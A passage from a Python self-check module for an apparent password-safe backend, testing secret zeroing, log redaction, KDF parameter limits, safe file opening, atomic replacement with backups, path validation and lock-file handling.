        pass
    ok("__exit__ zeroes on an exception", len(escbuf) == 0)

    # NOTE the local binding. `Secret.from_b64(...).bytes` on one line hands
    # back a buffer whose owner is already unreferenced, so __del__ zeroes it
    # before the next expression runs. That footgun is documented on the class;
    # this is the shape every caller must use.
    kf = Secret.from_b64(base64.b64encode(b"keyfile-bytes").decode())
    ok("from_b64 decodes key-file bytes", bytes(kf.bytes) == b"keyfile-bytes")
    kf.zero()
    raises("from_b64 refuses non-base64", Invalid,
           lambda: Secret.from_b64("!!!not base64!!!"))
    raises("from_b64 refuses an oversized key file", Invalid,
           lambda: Secret.from_b64(
               base64.b64encode(b"\0" * (Limits.MAX_KEYFILE_BYTES + 1))
               .decode()))
    ok("Secret.random has the requested length", len(Secret.random(32)) == 32)

    # ------------------------------------------------- redaction / ct-eq --
    print("\n== redaction and constant-time compare (I6, I15) ==")
    live = Secret(sentinel)
    line = ("unlock safe=lab-dc uid=1000 password=%s b64=%s"
            % (sentinel, base64.b64encode(sentinel.encode()).decode()))
    red = redact(line)
    ok("redact() removes the plaintext form", sentinel not in red)
    ok("redact() removes the base64 form",
       base64.b64encode(sentinel.encode()).decode() not in red)
    ok("redact() keeps the diagnostics", "safe=lab-dc" in red and "uid=1000" in red)
    ok("redact() uses the weak live registry (no explicit list needed)",
       REDACTED in red)
    live.zero()
    ok("a zeroed Secret leaves the registry", sentinel in redact(line))
    ok("explicit secrets still redact",
       sentinel not in redact(line, [sentinel]))
    ok("short secrets are not redacted (documented trade-off)",
       redact("ab", ["ab"]) == "ab")
    ok("constant_time_eq true case", constant_time_eq(b"abc", "abc") is True)
    ok("constant_time_eq false case", constant_time_eq(b"abc", b"abd") is False)
    ok("constant_time_eq handles non-ASCII str",
       constant_time_eq("pässwörd", "pässwörd") is True)

    # ---------------------------------------------------- error taxonomy --
    print("\n== error taxonomy (docs/CONTRACT.md) ==")
    ok("eight codes, no more", len(ERROR_CODES) == 8
       and set(ERROR_CLASSES) == set(ERROR_CODES))
    ok("BadCredential code", BadCredential("x").code == "bad-credential")
    ok("to_json has exactly error+detail",
       set(Conflict("y").to_json()) == {"error", "detail"})
    leaky = Secret(sentinel)
    e = Internal("failed while handling %s" % sentinel)
    ok("a detail cannot carry a live secret", sentinel not in e.detail)
    leaky.zero()
    ok("a detail is single-line",
       "\n" not in Invalid("a\nb\nc").detail)
    ok("a detail strips control characters",
       "\x1b" not in Invalid("esc\x1b[31mred").detail)
    ok("a detail is truncated", len(Invalid("x" * 5000).detail) <= 240)

    # ------------------------------------------------------------ Limits --
    print("\n== Limits clamps (I7) ==")
    raises("Argon2 m=4GiB", Invalid,
           lambda: Limits.check_argon2(4 * 1024 * 1024, 4, 2))
    raises("Argon2 t=1000000", Invalid,
           lambda: Limits.check_argon2(65536, 1000000, 2))
    raises("Argon2 p=255", Invalid, lambda: Limits.check_argon2(65536, 4, 255))
    ok("Argon2 legal parameters pass",
       Limits.check_argon2(65536, 4, 2) is None)
    raises("AES-KDF rounds=2^31", Invalid,
           lambda: Limits.check_aeskdf_rounds(2 ** 31))
    raises("PWS3 ITER=0", Invalid, lambda: Limits.check_pws3_iter(0))
    raises("PWS3 ITER=2^31", Invalid, lambda: Limits.check_pws3_iter(2 ** 31))
    ok("PWS3 ITER=2048 reads", Limits.check_pws3_iter(2048) is None)
    raises("PWS3 ITER=2048 refused for write", Invalid,
           lambda: Limits.check_pws3_iter(2048, for_write=True))
    ok("PWS3 write floor passes",
       Limits.check_pws3_iter(262144, for_write=True) is None)
    raises("field length 0xFFFFFFFF fails in O(1)", Invalid,
           lambda: Limits.check_length(0xFFFFFFFF, 100))
    raises("field length beyond the file", Invalid,
           lambda: Limits.check_length(200, 100))
    raises("kdf_budget refuses an overrun", Invalid,
           lambda: _budget_overrun())

    # -------------------------------------------------------- open_safe_fd --
    print("\n== open_safe_fd refusals (I4, I5) ==")
    tmpdir = tempfile.mkdtemp(prefix="cockpit-secrets-selfcheck-")
    try:
        os.chmod(tmpdir, 0o700)
        good = os.path.join(tmpdir, "good.kdbx")
        with open(good, "wb") as f:
            f.write(b"PAYLOAD-not-a-secret")
        os.chmod(good, 0o600)

        with open_safe_fd(good, expect_uid=os.geteuid()) as sf:
            ok("a 0600 file owned by us opens", sf.fd >= 0)
            ok("read_all returns the content",
               sf.read_all() == b"PAYLOAD-not-a-secret")
            fp = sf.fingerprint()
            ok("fingerprint has all three parts",
               fp.size == 20 and fp.mtime_ns > 0 and len(fp.sha256) == 64)
            ok("fingerprint matches itself", fp.matches(sf.fingerprint()))
            ok("fingerprint round-trips through a dict",
               Fingerprint.from_dict(fp.as_dict()) == fp)

        raises("relative path", Invalid,
               lambda: open_safe_fd("relative.kdbx", expect_uid=os.geteuid()))
        raises("missing file", NotFound,
               lambda: open_safe_fd(os.path.join(tmpdir, "nope.kdbx"),
                                    expect_uid=os.geteuid()))
        link = os.path.join(tmpdir, "link.kdbx")
        os.symlink(good, link)
        raises("symlink (O_NOFOLLOW)", AccessDenied,
               lambda: open_safe_fd(link, expect_uid=os.geteuid()))
        raises("wrong owner", AccessDenied,
               lambda: open_safe_fd(good, expect_uid=os.geteuid() + 4242))
        loose = os.path.join(tmpdir, "loose.kdbx")
        with open(loose, "wb") as f:
            f.write(b"x")
        os.chmod(loose, 0o644)
        raises("group/other-readable mode", AccessDenied,
               lambda: open_safe_fd(loose, expect_uid=os.geteuid()))
        subdir = os.path.join(tmpdir, "open-dir")
        os.mkdir(subdir, 0o777)
        os.chmod(subdir, 0o777)                 # world-writable, NOT sticky
        inner_safe = os.path.join(subdir, "s.kdbx")
        with open(inner_safe, "wb") as f:
            f.write(b"x")
        os.chmod(inner_safe, 0o600)
        raises("world-writable non-sticky parent", AccessDenied,
               lambda: open_safe_fd(inner_safe, expect_uid=os.geteuid()))
        os.chmod(subdir, 0o1777)                # world-writable but sticky
        with open_safe_fd(inner_safe, expect_uid=os.geteuid()) as sf:
            ok("a sticky world-writable parent is allowed", sf.fd >= 0)
        os.chmod(subdir, 0o700)
        raises("a directory is not a safe", Invalid,
               lambda: open_safe_fd(subdir, expect_uid=os.geteuid()))

        # ---------------------------------------------------- atomic_replace --
        print("\n== atomic_replace (I12, I13) ==")
        target = os.path.join(tmpdir, "safe.kdbx")
        with open(target, "wb") as f:
            f.write(b"generation-0")
        os.chmod(target, 0o600)
        with open_safe_fd(target, expect_uid=os.geteuid()) as sf:
            fp0 = sf.fingerprint()

        res = atomic_replace(target, b"generation-1", expect_fingerprint=fp0,
                             keep=3)
        ok("content was replaced",
           open(target, "rb").read() == b"generation-1")
        ok("result reports the byte count", res["bytes"] == len(b"generation-1"))
        ok("result carries a fresh fingerprint",
           isinstance(res["fingerprint"], Fingerprint)
           and res["fingerprint"].size == 12)
        ok("a backup was taken", res["backup"] and os.path.exists(res["backup"]))
        ok("the backup holds the PREVIOUS generation",
           open(res["backup"], "rb").read() == b"generation-0")
        ok("the backup is 0600",
           stat.S_IMODE(os.stat(res["backup"]).st_mode) == 0o600)
        ok("the replaced file is 0600",
           stat.S_IMODE(os.stat(target).st_mode) == 0o600)
        ok("no temp file was left behind",
           not any(n.startswith("safe.kdbx.tmp-") for n in os.listdir(tmpdir)))

        # the stale-fingerprint path: this is the I13 conflict
        raises("stale fingerprint is a Conflict", Conflict,
               lambda: atomic_replace(target, b"generation-2",
                                      expect_fingerprint=fp0, keep=3))
        ok("a refused save did NOT touch the file",
           open(target, "rb").read() == b"generation-1")

        # ring pruning: keep=3, write five more generations
        fp = res["fingerprint"]
        for i in range(2, 7):
            time.sleep(0.01)        # distinct mtime_ns, and distinct ring names
            fp = atomic_replace(target, ("generation-%d" % i).encode(),
                                expect_fingerprint=fp, keep=3)["fingerprint"]
        ring = sorted(os.listdir(target + ".bak.d"))
        ok("the backup ring keeps exactly `keep` generations", len(ring) == 3)
        ok("every ring member is 0600",
           all(stat.S_IMODE(os.stat(os.path.join(target + ".bak.d", n)).st_mode)
               == 0o600 for n in ring))
        ok("the ring directory is 0700",
           stat.S_IMODE(os.stat(target + ".bak.d").st_mode) == 0o700)

        raises("a backup dir under /tmp is refused", Invalid,
               lambda: atomic_replace(target, b"x", backup_dir="/tmp/backups",
                                      expect_fingerprint=fp))
        raises("a vanished safe is a Conflict", Conflict,
               lambda: atomic_replace(os.path.join(tmpdir, "ghost.kdbx"),
                                      b"x", expect_fingerprint=fp0))
        raises("a relative target is Invalid", Invalid,
               lambda: atomic_replace("rel.kdbx", b"x"))
        raises("non-bytes content is Invalid", Invalid,
               lambda: atomic_replace(target, "a string",
                                      expect_fingerprint=fp))

        # creation with no prior file and no expected fingerprint
        fresh = os.path.join(tmpdir, "fresh.kdbx")
        cres = atomic_replace(fresh, b"brand-new")
        ok("a new file can be created", open(fresh, "rb").read() == b"brand-new")
        ok("creating takes no backup", cres["backup"] is None)

        # -------------------------------------------------- validate_new_path --
        # NOTE the paths below are deliberately NOT under `tmpdir`: this
        # self-check's scratch directory lives in /tmp, which is precisely what
        # validate_new_path refuses, so a destination built from it would be
        # rejected for the wrong reason and prove nothing. Nothing here touches
        # the filesystem — the function only ever calls lexists.
        print("\n== validate_new_path (save_as / upgrade destinations) ==")
        want = "/var/lib/cockpit-secrets/selfcheck-%s.kdbx" % _sysrandom.token_hex(6)
        ok("an absolute, normal, unused path is accepted",
           validate_new_path(want) == want)
        raises("a relative destination -> Invalid", Invalid,
               lambda: validate_new_path("copy.kdbx"))
        raises("a destination containing .. -> Invalid", Invalid,
               lambda: validate_new_path("/var/lib/../lib/copy.kdbx"))
        raises("a doubled slash -> Invalid", Invalid,
               lambda: validate_new_path("/var//lib/copy.kdbx"))
        raises("a trailing slash -> Invalid", Invalid,
               lambda: validate_new_path("/var/lib/copy.kdbx/"))
        raises("a destination under /tmp -> Invalid", Invalid,
               lambda: validate_new_path("/tmp/copy.kdbx"))
        raises("a destination under /var/tmp -> Invalid", Invalid,
               lambda: validate_new_path("/var/tmp/copy.kdbx"))
        # /dev/null rather than a file we made: it exists on every host this
        # runs on and it is not under /tmp, so the Conflict it raises is the
        # "already taken" refusal and not the directory policy. The check is
        # `lexists`, so a dangling symlink planted at the name is refused too —
        # `exists` would follow it and answer False.
        raises("an existing destination -> Conflict", Conflict,
               lambda: validate_new_path("/dev/null"))

        # ---------------------------------------------------------- LockFile --
        print("\n== LockFile (I13) ==")
        ok("kdbx lock name appends .lock",
           LockFile.lock_path_for("/x/db.kdbx", "kdbx") == "/x/db.kdbx.lock")
        ok("psafe3 lock name replaces the extension",
           LockFile.lock_path_for("/x/db.psafe3", "psafe3") == "/x/db.plk")
        raises("an unknown format has no lock convention", Unsupported,
               lambda: LockFile.lock_path_for("/x/db.foo", "foo"))

        lk = LockFile(target, fmt="kdbx")
        with lk:
            ok("our lock file exists", os.path.exists(lk.lock_path))
            ok("our lock file is 0600",
               stat.S_IMODE(os.stat(lk.lock_path).st_mode) == 0o600)
            other = LockFile(target, fmt="kdbx")
            raises("a foreign lock is a Conflict naming the holder", Conflict,
                   other.acquire)
        ok("our lock is removed on exit", not os.path.exists(lk.lock_path))

        # a lock we did NOT create must survive our release
        foreign = target + ".lock"
        with open(foreign, "w") as f:
            f.write("[Lock]\nUserName=someone-else\n")
        os.chmod(foreign, 0o600)
        blocked = LockFile(target, fmt="kdbx")
        raises("a pre-existing foreign lock blocks acquire", Conflict,
               blocked.acquire)
        blocked.release()
        ok("release() left the foreign lock alone", os.path.exists(foreign))
        ok("the holder was reported", blocked.holder == "someone-else")

        override = LockFile(target, fmt="kdbx", override_stale=True)
        with override:
            ok("an explicit stale override takes the lock",
               os.path.exists(override.lock_path))
        ok("the override released its own lock",
           not os.path.exists(override.lock_path))

        # rule 2: if someone replaces our lock, we must not unlink theirs
        keeper = LockFile(target, fmt="kdbx").acquire()
        with open(keeper.lock_path, "w") as f:
            f.write("[Lock]\nUserName=took-it-over\n")
        keeper.release()
        ok("a lock replaced under us is NOT removed",
           os.path.exists(keeper.lock_path))
        os.unlink(keeper.lock_path)

        # ----------------------------------------------------- Backend ABC --
        print("\n== Backend ABC ==")
        ok("Backend cannot be instantiated",
           _cannot_instantiate(Backend, {"id": "x", "path": "/x"}))
        needed = {"probe", "unlock", "tree", "entries", "reveal", "totp",
                  "attach_get", "add", "edit", "move", "rm", "group_add",
                  "group_rm", "group_mv", "save", "lock",
                  # the second-phase interface: history, attachments, an
                  # operator-named copy, and the one method that empties the
                  # safe in one call.
                  "history", "history_restore", "attach_add", "attach_rm",
                  "save_as", "export_plain",
                  # `attach_list` is abstract rather than a default returning
                  # []: a default would let a backend that cannot do
                  # attachments answer "this entry has none", which is a
                  # different and untrue statement, and it would do it
                  # silently. Each backend states its own answer.
                  "attach_list"}
        ok("every CONTRACT.md verb is abstract",
           needed <= set(Backend.__abstractmethods__))
        ok("no extra abstract methods",
           set(Backend.__abstractmethods__) == needed)
        # A keyword-only `yubikey_response` on unlock is what lets a hardware
        # token be a key COMPONENT rather than a second passphrase prompt. It
        # is checked here because two backends and the helper all build to it,
        # and a positional drift would be silently accepted by every one of
        # them until a token was actually present.
        import inspect
        sig = inspect.signature(Backend.unlock)
        ok("unlock takes yubikey_response, keyword-only",
           sig.parameters.get("yubikey_response") is not None
           and sig.parameters["yubikey_response"].kind
           is inspect.Parameter.KEYWORD_ONLY
           and sig.parameters["yubikey_response"].default is None)
        for name, want in (("export_plain", "fmt"), ("save_as", "override_stale"),
                           ("attach_add", "replace")):
            p = inspect.signature(getattr(Backend, name)).parameters.get(want)
            ok("%s's %s is keyword-only" % (name, want),
               p is not None and p.kind is inspect.Parameter.KEYWORD_ONLY)

        stub = _StubBackend({"id": "s", "path": target, "mode": "ro"})
        raises("require_unlocked before unlock", AccessDenied,
               stub.require_unlocked)
        stub.unlocked = True
        raises("require_writable on a read-only safe", AccessDenied,
               stub.require_writable)
        raises("backend_for an unknown format", Unsupported,
               lambda: backend_for("nope"))
        ok("register_backend registers", backend_for("stub") is _StubBackend)
        ok("known_formats lists it", "stub" in known_formats())
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    print("\n%d checks, %d failure(s)" % (checks[0], len(failures)))
    for f in failures:
        print("  FAILED: %s" % f)
    return 1 if failures else 0


def _budget_overrun():
    with Limits.kdf_budget(seconds=0.0):
        time.sleep(0.01)


def _cannot_instantiate(cls, arg):
    try:
        cls(arg)
    except TypeError:
        return True
    return False


@register_backend("stub")
class _StubBackend(Backend):
    """Minimal concrete Backend, used only by the self-check to prove the ABC
    is complete and that the guards refuse before they permit."""

    def probe(self): return {}
    def unlock(self, password, keyfile=None, session=None, *,
               yubikey_response=None): return {}
    def tree(self): return {"groups": []}
    def entries(self, group=None, query=None, offset=0, limit=100):
        return {"total": 0, "entries": []}
    def reveal(self, uuid, field): raise NotFound("stub")
    def totp(self, uuid): raise Unsupported("stub")
    def attach_list(self, uuid): return []
    def attach_get(self, uuid, name): raise NotFound("stub")
    def history(self, uuid): return []
    def export_plain(self, *, fmt): raise Unsupported("stub")
    def add(self, group, entry): raise Unsupported("stub")
    def edit(self, uuid, changes): raise Unsupported("stub")
    def move(self, uuid, group): raise Unsupported("stub")
    def rm(self, uuid, permanent=False): raise Unsupported("stub")
    def group_add(self, parent, name): raise Unsupported("stub")
    def group_rm(self, uuid, permanent=False): raise Unsupported("stub")
    def group_mv(self, uuid, parent): raise Unsupported("stub")
    def history_restore(self, uuid, index): raise Unsupported("stub")
    def attach_add(self, uuid, name, data, *, replace=False):
        raise Unsupported("stub")
    def attach_rm(self, uuid, name): raise Unsupported("stub")
    def save(self, *, override_stale=False): raise Unsupported("stub")
    def save_as(self, target_path, *, override_stale=False):
        raise Unsupported("stub")
    def lock(self): return {"ok": True}


if __name__ == "__main__":
    sys.exit(_selfcheck())
